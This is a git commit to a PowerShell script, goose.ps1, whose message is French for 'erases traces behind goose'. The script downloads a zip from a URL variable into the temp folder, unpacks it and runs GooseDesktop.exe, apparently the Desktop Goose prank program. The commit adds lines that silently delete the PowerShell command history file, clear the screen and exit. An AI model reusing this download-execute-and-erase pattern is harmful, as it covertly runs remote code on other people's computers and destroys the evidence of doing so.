370478b64be66327c290208544c1aaf6b9504aa5
Xil <mail@xil.boats>
2022-12-28 15:33:06 +0100

    Efface les trace derrière goose

--- goose.ps1
+++ goose.ps1
@@ -2,3 +2,6 @@ Invoke-WebRequest -URI "$lk" -OutFile $env:TEMP\goose.zip
 Expand-Archive -Path $env:TEMP\goose.zip -DestinationPath $env:TEMP\goose
 $goose = $env:TEMP + "\goose\Goose\Goose\GooseDesktop.exe"
 Invoke-Expression $goose
+Remove-Item (Get-PSreadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+clear
+exit
